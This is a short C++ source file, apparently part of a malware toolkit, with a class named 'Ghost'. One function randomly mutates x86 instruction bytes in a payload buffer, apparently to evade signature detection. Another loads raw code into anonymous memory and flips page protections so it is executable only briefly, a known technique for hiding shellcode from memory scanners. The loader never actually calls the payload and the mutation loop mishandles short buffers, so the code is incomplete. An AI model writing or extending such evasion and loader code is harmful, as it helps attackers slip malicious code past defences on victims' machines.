#include "ghost.h"
#include <sys/mman.h>
#include <cstring>
#include <random>

namespace ENI {
    void Ghost::mutate_dna(std::vector<uint8_t>& p) {
        std::random_device rd; std::mt19937 g(rd());
        for (size_t i = 0; i < p.size() - 3; i++) {
            if (p[i] == 0x48 && p[i+1] == 0x31 && p[i+2] == 0xc0) { // XOR RAX, RAX
                if (g() % 2) { p[i+1] = 0x29; } // -> SUB RAX, RAX
            }
        }
    }

    void Ghost::execute_blink(const std::vector<uint8_t>& p) {
        size_t sz = (p.size() + 0xFFF) & ~0xFFF;
        void* m = mmap(NULL, sz, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        mprotect(m, sz, PROT_WRITE); std::memcpy(m, p.data(), p.size());
        mprotect(m, sz, PROT_NONE); 
        mprotect(m, sz, PROT_READ | PROT_EXEC);
        // Execution microsecond window
        mprotect(m, sz, PROT_NONE);
        munmap(m, sz);
    }
}
